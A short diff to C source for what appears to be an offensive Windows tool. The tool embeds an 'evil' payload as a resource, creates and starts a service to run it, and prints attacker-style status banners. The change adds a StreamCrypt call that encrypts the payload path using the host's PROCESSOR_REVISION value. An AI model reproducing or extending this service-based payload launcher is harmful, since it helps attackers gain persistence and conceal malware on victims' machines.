@@ -176,6 +176,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 		BOOL bRet = FALSE;
 		char* szFileName = argv[0];
 		szName = argv[2];
+		char* evilName = argv[1];
 		printf("[*] CreateService by Uknow\n");
 		if (strcmp(argv[3], "start") == 0) {
 			if (!AddResource(szFileName, argv[1]))
@@ -194,9 +195,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 				printf("   [-] Start Error!\n");
 				return -1;
 			}
+			StreamCrypt(evilName, strlen(evilName), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
 			printf("    [+] ServiceName: %s\n", szName);
 			printf("    [+] TransitPathName: %s\n", szFileName);
-			printf("    [+] EvilPathName: %s\n", argv[1]);
+			printf("    [+] EvilPathName: %s\n", evilName);
 			printf("    [+] Success! Service successfully Create and Start.\n");
 			return 0;
 		}
